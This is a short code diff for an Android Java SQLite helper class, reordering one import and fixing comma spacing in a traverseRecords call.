@@ -4,12 +4,12 @@ import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.file.AutoFile;
 import com.android.syssetup.file.Path;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.Utils;
-import com.android.mm.M;
 
 import java.io.File;
 import java.io.IOException;
@@ -132,7 +132,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	}
 
 	public long traverseRecords(String table, RecordVisitor visitor) {
-		return traverseRecords(table,visitor,false);
+		return traverseRecords(table, visitor, false);
 	}
 
 	/**
